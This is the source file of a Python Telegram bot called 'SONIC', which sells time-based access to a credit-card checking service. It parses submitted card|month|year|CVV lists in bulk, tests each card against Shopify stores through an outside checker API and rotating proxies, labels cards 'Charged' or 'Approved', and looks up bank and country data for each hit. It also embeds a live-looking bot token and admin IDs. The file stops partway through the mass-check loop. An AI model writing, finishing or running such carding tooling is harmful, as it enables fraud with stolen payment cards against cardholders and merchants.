#!/usr/bin/env python3
# SONIC BOT - python-telegram-bot version
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import secrets
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from collections import deque

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, LabeledPrice,
    PreCheckoutQuery, SuccessfulPayment, User, BotCommand
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler,
    PreCheckoutQueryHandler, filters, CallbackContext, JobQueue
)
from telegram.constants import ParseMode
import requests

# ==================== التكوين ====================
BOT_TOKEN = '8985561921:AAH26NPSH3Iin7RCpKfi1Q057X1umDjfgds'
CHECKER_API_URL = 'https://apiehopf-production.up.railway.app'
ADMIN_IDS = [1093032296, 7077116674]
OWNER_CHANNEL_ID = -1002635018188  # تم تعيينه منك
OWNER_CHANNEL_LINK = 'https://t.me/ReGict7'

# إعدادات الاشتراك بالنجوم (زمني)
STAR_PRICES = {
    "1h": {"name": "1 Hour", "stars": 30, "seconds": 3600},
    "12h": {"name": "12 Hours", "stars": 50, "seconds": 43200},
    "1d": {"name": "1 Day", "stars": 100, "seconds": 86400},
    "3d": {"name": "3 Days", "stars": 250, "seconds": 259200},
    "7d": {"name": "1 Week", "stars": 500, "seconds": 604800},
}

# إعدادات الفحص
MAX_CARDS_PER_COMBO = 5000
ADMIN_MAX_CARDS = 50000
PENDING_TIMEOUT = 300
MESSAGE_DELAY = 1.5
MAX_WORKERS = 6

# البوابات المسموحة (Shopify فقط)
ALLOWED_GATEWAYS = ['shopify payments', 'shopify', 'shopify_payments']

# فلتر الأسعار
PRICE_RANGES = {
    "1": {"name": "🔰 1$ - 10$", "min": 1, "max": 10},
    "2": {"name": "💰 5$ - 20$", "min": 5, "max": 20},
    "3": {"name": "💎 10$ - 30$", "min": 10, "max": 30},
    "4": {"name": "⭐ No filter", "min": 0, "max": 999999}
}

# متغيرات الجلسات النشطة (للـ Mass Check)
active_sessions: Dict[str, Dict] = {}
user_current_check: Dict[int, bool] = {}
user_pending_mass: Dict[int, Dict] = {}
user_pending_sites: Dict[int, Dict] = {}

# ==================== دوال الملفات ====================
def load_sites() -> List[str]:
    if not os.path.exists('sites.txt'):
        return []
    try:
        with open('sites.txt', 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_sites(sites: List[str]):
    with open('sites.txt', 'w', encoding='utf-8') as f:
        for site in sites:
            f.write(f"{site}\n")

def get_user_proxy_file(user_id: int) -> str:
    return f"user_{user_id}_proxy.txt"

def load_user_proxies(user_id: int) -> List[str]:
    path = get_user_proxy_file(user_id)
    if not os.path.exists(path):
        return []
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_user_proxies(user_id: int, proxies: List[str]):
    with open(get_user_proxy_file(user_id), 'w', encoding='utf-8') as f:
        for proxy in proxies:
            f.write(f"{proxy}\n")

# ==================== دوال المستخدمين والاشتراكات ====================
USERS_FILE = 'users.json'
CODES_FILE = 'codes.json'

def load_users() -> Dict:
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_users(users: Dict):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def load_codes() -> Dict:
    if not os.path.exists(CODES_FILE):
        return {}
    try:
        with open(CODES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_codes(codes: Dict):
    with open(CODES_FILE, 'w', encoding='utf-8') as f:
        json.dump(codes, f, indent=2, ensure_ascii=False)

def get_user_subscription(user_id: int) -> Tuple[bool, float]:
    users = load_users()
    data = users.get(str(user_id), {})
    expiry = data.get('subscription_expiry', 0)
    return expiry > time.time(), expiry

def get_user_time_left(user_id: int) -> str:
    if user_id in ADMIN_IDS:
        return "♾️ Unlimited"
    active, expiry = get_user_subscription(user_id)
    if active:
        remaining = int(expiry - time.time())
        h = remaining // 3600
        m = (remaining % 3600) // 60
        return f"{h}h {m}m"
    return "❌ Expired"

def activate_subscription(user_id: int, plan_key: str) -> bool:
    plan = STAR_PRICES.get(plan_key)
    if not plan:
        return False
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {}
    now = time.time()
    current = users[uid].get('subscription_expiry', 0)
    new_expiry = current + plan['seconds'] if current > now else now + plan['seconds']
    users[uid]['subscription_expiry'] = new_expiry
    users[uid]['premium'] = True
    save_users(users)
    return True

def create_activation_code(seconds: int = 86400) -> str:
    codes = load_codes()
    code = secrets.token_hex(8).upper()
    codes[code] = {
        'seconds': seconds,
        'used': False,
        'used_by': None,
        'created_at': datetime.now().isoformat()
    }
    save_codes(codes)
    return code

def activate_code(user_id: int, code: str) -> Tuple[bool, str]:
    if user_id in ADMIN_IDS:
        return True, "👑 أنت أدمن، لا تحتاج تفعيل!"
    codes = load_codes()
    if code not in codes:
        return False, "❌ الكود غير صالح!"
    data = codes[code]
    if data.get('used'):
        return False, "❌ الكود مستخدم من قبل!"
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {}
    now = time.time()
    current = users[uid].get('subscription_expiry', 0)
    new_expiry = current + data['seconds'] if current > now else now + data['seconds']
    users[uid]['subscription_expiry'] = new_expiry
    users[uid]['premium'] = True
    data['used'] = True
    data['used_by'] = uid
    data['used_at'] = datetime.now().isoformat()
    save_users(users)
    save_codes(codes)
    hours = data['seconds'] // 3600
    return True, f"✅ تم التفعيل! أضيف {hours} ساعة. ينتهي في {datetime.fromtimestamp(new_expiry).strftime('%Y-%m-%d %H:%M:%S')}"

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def is_user_blocked(user_id: int) -> bool:
    users = load_users()
    return users.get(str(user_id), {}).get('blocked', False)

def block_user(user_id: int):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {}
    users[uid]['blocked'] = True
    save_users(users)

def unblock_user(user_id: int):
    users = load_users()
    uid = str(user_id)
    if uid in users:
        users[uid]['blocked'] = False
        save_users(users)

def get_all_users() -> Dict:
    return load_users()

async def create_user_if_not_exists(update: Update, context: CallbackContext):
    user = update.effective_user
    if not user:
        return
    uid = str(user.id)
    users = load_users()
    if uid not in users:
        users[uid] = {
            'user_id': user.id,
            'username': user.username or f"user_{user.id}",
            'registered_at': datetime.now().isoformat(),
            'subscription_expiry': 0,
            'premium': False,
            'blocked': False
        }
        save_users(users)

# ==================== دوال الفحص (Async) ====================
def parse_proxy_url(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if '@' in proxy_str:
        return f"http://{proxy_str}"
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    if len(parts) == 2:
        return f"http://{host}:{port}"
    return None

async def test_proxy_fast(proxy_str: str) -> Dict:
    proxy_url = parse_proxy_url(proxy_str)
    if not proxy_url:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Invalid format'}
    try:
        timeout = aiohttp.ClientTimeout(total=4)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get("https://musicstore.myshopify.com", proxy=proxy_url, ssl=False) as resp:
                if resp.status == 200:
                    return {'proxy': proxy_str, 'status': 'alive', 'reason': '✅ OK'}
                return {'proxy': proxy_str, 'status': 'dead', 'reason': f'HTTP {resp.status}'}
    except:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': '⏱️ Timeout'}

async def is_site_shopify(site: str, proxy: str) -> Tuple[bool, Optional[str]]:
    test_card = "4031630422575208|01|2030|280"
    try:
        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
        if proxy:
            url += f'&proxy={proxy}'
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return False, None
                raw = await resp.json()
                gateway = raw.get('Gateway', '').lower()
                if gateway and any(allowed in gateway for allowed in ALLOWED_GATEWAYS):
                    return True, gateway
                return False, gateway
    except:
        return False, None

async def get_site_min_price(site: str, proxy: str) -> Optional[float]:
    try:
        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'https://{site}/products.json?limit=50'
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url, ssl=False) as resp:
                if resp.status != 200:
                    return None
                data = await resp.json()
                min_price = None
                for product in data.get('products', []):
                    for variant in product.get('variants', []):
                        if variant.get('available', True):
                            try:
                                price = float(variant.get('price', 0))
                                if min_price is None or price < min_price:
                                    min_price = price
                            except:
                                pass
                return min_price
    except:
        return None

async def check_card(card: str, site: str, proxy: str) -> Dict:
    try:
        if '|' not in card or len(card.split('|')) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={card}'
        if proxy:
            url += f'&proxy={proxy}'
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Dead', 'message': f'HTTP {resp.status}', 'card': card}
                raw = await resp.json()
        msg = raw.get('Response', '')
        price = raw.get('Price', 0.0)
        gateway = raw.get('Gateway', 'Shopify')
        try:
            price = f"${float(price):.2f}"
        except:
            price = "-"
        charged = ['ORDER_PLACED', 'PROCESSEDRECEIPT', 'ORDER_CONFIRMED', 'SUCCESS', 'CHARGED']
        approved = ['INSUFFICIENT_FUNDS', 'OTP_REQUIRED', '3D_SECURE', 'ACTION_REQUIRED']
        up = msg.upper()
        if any(k in up for k in charged):
            return {'status': 'Charged', 'message': msg, 'card': card, 'gateway': gateway, 'price': price}
        elif any(k in up for k in approved):
            return {'status': 'Approved', 'message': msg, 'card': card, 'gateway': gateway, 'price': price}
        return {'status': 'Dead', 'message': msg or 'Declined', 'card': card, 'gateway': gateway, 'price': price}
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Timeout', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card: str, sites: List[str], proxies: List[str], max_retries=2) -> Dict:
    if not sites or not proxies:
        return {'status': 'Dead', 'message': 'No sites/proxies', 'card': card}
    for _ in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        res = await check_card(card, site, proxy)
        if not res.get('retry'):
            return res
        await asyncio.sleep(0.5)
    return {'status': 'Dead', 'message': 'Max retries', 'card': card}

async def get_bin_info(card_number: str) -> Tuple[str, ...]:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{card_number[:6]}') as resp:
                if resp.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await resp.json()
                return (data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'),
                        data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', ''))
    except:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text: str) -> List[str]:
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    cards = []
    for match in re.findall(pattern, text):
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

# ==================== دوال الواجهة ====================
def get_main_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📋 Commands", callback_data="show_commands")],
        [InlineKeyboardButton("📢 Channel", url=OWNER_CHANNEL_LINK)]
    ])

def get_back_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])

def get_subscription_keyboard() -> InlineKeyboardMarkup:
    kb = []
    for key, plan in STAR_PRICES.items():
        kb.append([InlineKeyboardButton(f"⭐ {plan['name']} - {plan['stars']}⭐", callback_data=f"sub_{key}")])
    kb.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
    return InlineKeyboardMarkup(kb)

def get_price_filter_keyboard() -> InlineKeyboardMarkup:
    kb = [
        [InlineKeyboardButton("🔰 1$ - 10$", callback_data="price_1")],
        [InlineKeyboardButton("💰 5$ - 20$", callback_data="price_2")],
        [InlineKeyboardButton("💎 10$ - 30$", callback_data="price_3")],
        [InlineKeyboardButton("⭐ No filter", callback_data="price_4")],
        [InlineKeyboardButton("🔙 Cancel", callback_data="price_cancel")]
    ]
    return InlineKeyboardMarkup(kb)

def get_mass_mode_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💎 CHARGES ONLY", callback_data="mode_charges")],
        [InlineKeyboardButton("💎 + ✅ ALL HITS", callback_data="mode_all")],
        [InlineKeyboardButton("❌ Cancel", callback_data="mode_cancel")]
    ])

def get_admin_sites_menu() -> InlineKeyboardMarkup:
    kb = [
        [InlineKeyboardButton("📋 View Sites", callback_data="admin_view_sites")],
        [InlineKeyboardButton("➕ Add Site", callback_data="admin_add_site")],
        [InlineKeyboardButton("🗑️ Remove Site", callback_data="admin_remove_site")],
        [InlineKeyboardButton("📁 Upload File", callback_data="admin_upload_sites")],
        [InlineKeyboardButton("🔍 Check Sites", callback_data="admin_check_sites")],
        [InlineKeyboardButton("💣 Clear All", callback_data="admin_clear_sites")],
        [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]
    ]
    return InlineKeyboardMarkup(kb)

def get_admin_main_keyboard() -> InlineKeyboardMarkup:
    kb = [
        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🔨 Block", callback_data="admin_block")],
        [InlineKeyboardButton("🔓 Unblock", callback_data="admin_unblock")],
        [InlineKeyboardButton("📈 Add Time", callback_data="admin_set_limit")],
        [InlineKeyboardButton("🌐 Sites", callback_data="admin_sites")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(kb)

async def get_user_stats_text(user_id: int, username: str) -> str:
    users = load_users()
    data = users.get(str(user_id), {})
    is_blocked = data.get('blocked', False)
    sites_count = len(load_sites())
    proxies_count = len(load_user_proxies(user_id))
    time_left = get_user_time_left(user_id)
    if is_blocked:
        status = "🚫 Blocked"
    elif is_admin(user_id):
        status = "👑 ADMIN | ♾️ Unlimited"
    else:
        active, _ = get_user_subscription(user_id)
        if active:
            status = f"⭐ ACTIVE | {time_left} left"
        else:
            status = "🆓 EXPIRED | /subscribe"
    text = f"""👋 Welcome @{username}!

🚀 <b>SONIC Account</b>

    ┣ 📝 Plan: {status}
    ┣ 🌐 Sites: {sites_count}
    ┣ 🔌 Your Proxies: {proxies_count}
    ┗ 💡 Max combo: {MAX_CARDS_PER_COMBO} cards

📢 <b>Channel:</b> @ReGict7

💡 <b>Buy subscription:</b> /subscribe
🔌 <b>Add proxies:</b> /addproxy

💡 <b>Made by:</b> @ISoonik"""
    return text

# ==================== أوامر البوت ====================
async def start(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 <b>You have been banned from SONIC Bot.</b>", parse_mode=ParseMode.HTML)
        return
    await create_user_if_not_exists(update, context)
    text = await get_user_stats_text(user.id, user.username or str(user.id))
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=get_main_keyboard())

async def help_command(update: Update, context: CallbackContext):
    await start(update, context)

async def profile(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 Banned")
        return
    users = load_users()
    data = users.get(str(user.id), {})
    proxies = len(load_user_proxies(user.id))
    reg = data.get('registered_at', datetime.now().isoformat())[:10]
    active, expiry = get_user_subscription(user.id)
    expiry_str = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S') if active else "No subscription"
    sites_count = len(load_sites())
    text = f"""<b>👤 SONIC Profile</b>
├ 🆔 ID: <code>{user.id}</code>
├ 👤 Name: {user.first_name}
├ 📝 Username: @{user.username or 'None'}
├ 🌐 Total Sites: {sites_count}
├ 🔌 Your Proxies: {proxies}
├ ⭐ Status: {'👑 ADMIN' if is_admin(user.id) else '✅ PREMIUM' if active else '❌ FREE'}
├ 📅 Registered: {reg}
└ ⭐ Subscription: {'✅ Active until ' + expiry_str if active else '❌ No active subscription'}"""
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=get_back_keyboard())

async def myproxy(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 Banned")
        return
    proxies = load_user_proxies(user.id)
    if not proxies:
        await update.message.reply_text("❌ No proxies found. Use /addproxy to add.")
        return
    if len(proxies) <= 50:
        text = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        await update.message.reply_text(f"<b>📋 Your proxies ({len(proxies)}):</b>\n\n{text}", parse_mode=ParseMode.HTML)
    else:
        path = f"proxies_{user.id}.txt"
        async with aiofiles.open(path, 'w') as f:
            await f.write("\n".join(proxies))
        await update.message.reply_document(document=open(path, 'rb'), caption=f"<b>📋 Your proxies ({len(proxies)})</b>", parse_mode=ParseMode.HTML)
        os.remove(path)

async def addproxy(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 Banned")
        return
    lines = update.message.text.split('\n')[1:]
    if not lines:
        await update.message.reply_text("❌ Send proxies after command, one per line\nExample:\n/addproxy\nip:port:user:pass\nip:port")
        return
    current = load_user_proxies(user.id)
    new = [p.strip() for p in lines if p.strip() and p.strip() not in current]
    if not new:
        await update.message.reply_text("⚠️ No new proxies")
        return
    async with aiofiles.open(get_user_proxy_file(user.id), 'a') as f:
        for p in new:
            await f.write(f"{p}\n")
    await update.message.reply_text(f"✅ Added {len(new)} proxies\nTotal: {len(current)+len(new)}")

async def addproxies(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 Banned")
        return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Reply to a .txt file containing proxies")
        return
    doc = update.message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please reply to a .txt file")
        return
    file = await context.bot.get_file(doc.file_id)
    path = f"temp_proxies_{user.id}.txt"
    await file.download_to_drive(path)
    async with aiofiles.open(path, 'r') as f:
        content = await f.read()
    proxies = [l.strip() for l in content.split('\n') if l.strip()]
    os.remove(path)
    if not proxies:
        await update.message.reply_text("❌ No valid proxies found")
        return
    current = load_user_proxies(user.id)
    new = [p for p in proxies if p not in current]
    if new:
        async with aiofiles.open(get_user_proxy_file(user.id), 'a') as f:
            for p in new:
                await f.write(f"{p}\n")
    await update.message.reply_text(f"✅ Added {len(new)} proxies\nTotal: {len(current)+len(new)}")

async def chkproxy(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 Banned")
        return
    args = update.message.text.split(maxsplit=1)
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: /chkproxy ip:port:user:pass")
        return
    msg = await update.message.reply_text("🔄 SONIC checking...")
    res = await test_proxy_fast(args[1])
    if res['status'] == 'alive':
        await msg.edit_text(f"✅ <b>Proxy is ALIVE!</b>\n<code>{args[1]}</code>", parse_mode=ParseMode.HTML)
    else:
        await msg.edit_text(f"❌ <b>Proxy is DEAD!</b>\n{res['reason']}", parse_mode=ParseMode.HTML)

async def rmproxy(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 Banned")
        return
    args = update.message.text.split(maxsplit=1)
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: /rmproxy ip:port")
        return
    proxy = args[1]
    proxies = load_user_proxies(user.id)
    if proxy not in proxies:
        await update.message.reply_text(f"❌ Proxy not found")
        return
    save_user_proxies(user.id, [p for p in proxies if p != proxy])
    await update.message.reply_text(f"✅ Removed")

async def clearproxy(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 Banned")
        return
    count = len(load_user_proxies(user.id))
    if count == 0:
        await update.message.reply_text("❌ No proxies to clear")
        return
    save_user_proxies(user.id, [])
    await update.message.reply_text(f"✅ Cleared {count} proxies")

async def proxy_check(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 Banned")
        return
    proxies = load_user_proxies(user.id)
    if not proxies:
        await update.message.reply_text("❌ No proxies to check")
        return
    msg = await update.message.reply_text(f"⚡ SONIC checking {len(proxies)} proxies...")
    batch_size = 25
    alive = []
    dead = []
    total = len(proxies)
    for i in range(0, total, batch_size):
        batch = proxies[i:i+batch_size]
        tasks = [test_proxy_fast(p) for p in batch]
        results = await asyncio.gather(*tasks)
        for res in results:
            if res['status'] == 'alive':
                alive.append(res['proxy'])
            else:
                dead.append(res['proxy'])
        await msg.edit_text(f"⚡ Checking...\n📊 {min(i+batch_size, total)}/{total}\n✅ Alive: {len(alive)}\n❌ Dead: {len(dead)}", parse_mode=ParseMode.HTML)
    save_user_proxies(user.id, alive)
    await msg.edit_text(f"✅ <b>Proxy Check Complete!</b>\n\nTotal: {total}\n✅ Alive: {len(alive)}\n❌ Dead: {len(dead)}", parse_mode=ParseMode.HTML)

async def getproxy(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 Banned")
        return
    proxies = load_user_proxies(user.id)
    if not proxies:
        await update.message.reply_text("❌ No proxies found")
        return
    if len(proxies) <= 50:
        text = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        await update.message.reply_text(f"<b>📋 Your Proxies ({len(proxies)}):</b>\n\n{text}", parse_mode=ParseMode.HTML)
    else:
        path = f"user_proxies_{user.id}.txt"
        async with aiofiles.open(path, 'w') as f:
            for i, p in enumerate(proxies):
                await f.write(f"{i+1}. {p}\n")
        await update.message.reply_document(document=open(path, 'rb'), caption=f"📋 {len(proxies)} proxies")
        os.remove(path)

async def mcancel(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    for key in list(active_sessions.keys()):
        if key.startswith(f"{user_id}_"):
            del active_sessions[key]
    user_current_check[user_id] = False
    await update.message.reply_text("✅ SONIC mass check cancelled")

# ==================== فحص الكروت ====================
async def single_cc(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 Banned")
        return
    if user_current_check.get(user.id):
        await update.message.reply_text("⏳ SONIC is busy. Wait for previous check to finish")
        return
    if not is_admin(user.id):
        active, _ = get_user_subscription(user.id)
        if not active:
            await update.message.reply_text("❌ No active subscription\n\n💡 Buy: /subscribe\n🎫 Redeem: /redeem CODE")
            return
    sites = load_sites()
    proxies = load_user_proxies(user.id)
    if not sites:
        await update.message.reply_text("❌ No sites available. Contact admin.")
        return
    if not proxies:
        await update.message.reply_text("❌ No proxies\n\nAdd proxies using:\n/addproxy\n/addproxies")
        return
    args = update.message.text.split(maxsplit=1)
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: /cc 4242424242424242|12|25|123")
        return
    cards = extract_cc(args[1])
    if not cards:
        await update.message.reply_text("❌ Invalid card format\n\nCorrect: card|MM|YYYY|CVV")
        return
    card = cards[0]
    user_current_check[user.id] = True
    msg = await update.message.reply_text(f"⚡ SONIC checking <code>{card}</code>...", parse_mode=ParseMode.HTML)
    try:
        res = await check_card_with_retry(card, sites, proxies, 3)
        brand, typ, lvl, bank, country, flag = await get_bin_info(card.split('|')[0])
        time_left = get_user_time_left(user.id)
        status_emoji = "💎" if res['status'] == 'Charged' else "✅" if res['status'] == 'Approved' else "❌"
        await msg.edit_text(f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 SONIC Result</b>
<blockquote>{status_emoji} Status: {res['status'].upper()}</blockquote>
<blockquote>💳 Card: <code>{card}</code></blockquote>
<blockquote>📝 Response: {res['message'][:100]}</blockquote>
<blockquote>🌐 Gateway: {res.get('gateway', 'Unknown')} | 💰 {res.get('price', '-')}</blockquote>
<b>💠 BIN Info</b>
<pre>BIN: {brand} - {typ} - {lvl}
Bank: {bank}
Country: {country} {flag}</pre>
<b>⏱️ Time left: {time_left}</b>""", parse_mode=ParseMode.HTML)
        if res['status'] == 'Charged':
            await send_hit_notification(user.id, res, 'Charged', context)
        elif res['status'] == 'Approved':
            await send_hit_notification(user.id, res, 'Approved', context)
    except Exception as e:
        await msg.edit_text(f"❌ Error: {e}")
    finally:
        user_current_check[user.id] = False

async def send_hit_notification(user_id: int, result: Dict, hit_type: str, context: CallbackContext):
    emoji = "💎" if hit_type == 'Charged' else "✅"
    status_text = "CHARGED" if hit_type == 'Charged' else "APPROVED"
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    msg = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ 𝐇𝐢𝐭</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 Gateway: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>💠 BIN Info</b>
<pre>BIN: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}</pre>"""
    await context.bot.send_message(chat_id=user_id, text=msg, parse_mode=ParseMode.HTML)
    if hit_type == 'Charged' and OWNER_CHANNEL_ID:
        try:
            channel_msg = f"""<b>🎯 New Order Placed!</b>
👤 User: <code>{user_id}</code>
💎 Status: CHARGED
🌐 Gateway: {result.get('gateway', 'Unknown')}
💰 Amount: {result.get('price', '-')}
⏱️ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
            await context.bot.send_message(chat_id=OWNER_CHANNEL_ID, text=channel_msg, parse_mode=ParseMode.HTML)
        except:
            pass

# ==================== فحص جماعي (مع أزرار التحكم) ====================
async def mass_check(update: Update, context: CallbackContext):
    user = update.effective_user
    if is_user_blocked(user.id) and not is_admin(user.id):
        await update.message.reply_text("🚫 Banned")
        return
    if user_current_check.get(user.id):
        await update.message.reply_text("⏳ SONIC is busy. Wait for previous check to finish")
        return
    if not is_admin(user.id):
        active, _ = get_user_subscription(user.id)
        if not active:
            await update.message.reply_text("❌ No active subscription\n\n💡 Buy: /subscribe\n🎫 Redeem: /redeem CODE")
            return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Reply to a .txt file containing cards")
        return
    doc = update.message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please reply to a .txt file")
        return
    sites = load_sites()
    proxies = load_user_proxies(user.id)
    if not sites or not proxies:
        await update.message.reply_text("❌ Add sites and proxies first")
        return
    file = await context.bot.get_file(doc.file_id)
    path = f"temp_cards_{user.id}.txt"
    await file.download_to_drive(path)
    async with aiofiles.open(path, 'r') as f:
        content = await f.read()
    cards = extract_cc(content)
    os.remove(path)
    if not cards:
        await update.message.reply_text("❌ No valid cards found")
        return
    max_cards = MAX_CARDS_PER_COMBO if not is_admin(user.id) else ADMIN_MAX_CARDS
    if len(cards) > max_cards:
        await update.message.reply_text(f"⚠️ Max {max_cards} cards per combo. Checking first {max_cards} cards.")
        cards = cards[:max_cards]
    user_pending_mass[user.id] = {'cards': cards, 'sites': sites, 'proxies': proxies, 'mode': None}
    await update.message.reply_text("📋 SONIC Select mode:", reply_markup=get_mass_mode_keyboard())

async def mode_selection(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    if data == "mode_cancel":
        if user_id in user_pending_mass:
            del user_pending_mass[user_id]
        await query.edit_message_text("❌ SONIC mass check cancelled")
        return
    mode = "charges_only" if data == "mode_charges" else "all_hits"
    pending = user_pending_mass.pop(user_id, None)
    if not pending:
        await query.edit_message_text("Session expired, use /chk again")
        return
    cards = pending['cards']
    sites = pending['sites']
    proxies = pending['proxies']
    user_current_check[user_id] = True
    session_key = f"{user_id}_{int(time.time())}"
    active_sessions[session_key] = {'paused': False, 'stop': False}
    msg = await query.edit_message_text(f"🚀 SONIC starting {len(cards)} cards...")
    # تشغيل المهمة في الخلفية
    context.application.create_task(run_mass_check(user_id, cards, sites, proxies, mode, session_key, msg.message_id, context))

async def run_mass_check(user_id: int, cards: List[str], sites: List[str], proxies: List[str],
                         mode: str, session_key: str, message_id: int, context: CallbackContext):
    results = {'charged': [], 'approved': [], 'dead': [], 'total': len(cards), 'checked': 0, 'start': time.time()}
    card_responses = []
    for idx, card in enumerate(cards):
        sess = active_sessions.get(session_key)
        if not sess or sess.get('stop'):
            break
        while sess.get('paused'):
            await asyncio.sleep(1)
            if not active_sessions.get(session_key):
                break
        res = await check_card_with_retry(card, sites, proxies, 1)
        results['checked'] += 1
        card_responses.append({'card': card, 'status': res['status'], 'msg': res['message'][:40]})
        if res['status'] == 'Charged':
            results['charged'].append(res)
            await send_hit_notification(user_id, res, 'Charged', context)
